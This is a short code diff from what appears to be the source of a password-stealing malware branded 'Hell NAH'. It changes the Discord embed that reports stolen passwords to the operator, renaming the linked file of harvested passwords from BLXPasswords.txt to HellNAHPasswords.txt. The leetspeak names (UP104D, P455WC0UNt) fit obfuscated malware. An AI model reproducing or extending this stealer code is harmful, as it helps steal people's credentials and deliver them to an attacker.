@@ -635,7 +635,7 @@ def UP104D(name, link):
             "embeds": [
                 {
                     "title": "Hell NAH | Passwords",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [BLXPasswords.txt]({link})",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <:blacklock:1095741022065131571> • **{P455WC0UNt}** Passwords Found\n <:blackarrow:1095740975197995041> • [HellNAHPasswords.txt]({link})",
                     "color": color,
                     "footer": {
                         "text": "Hell NAH",
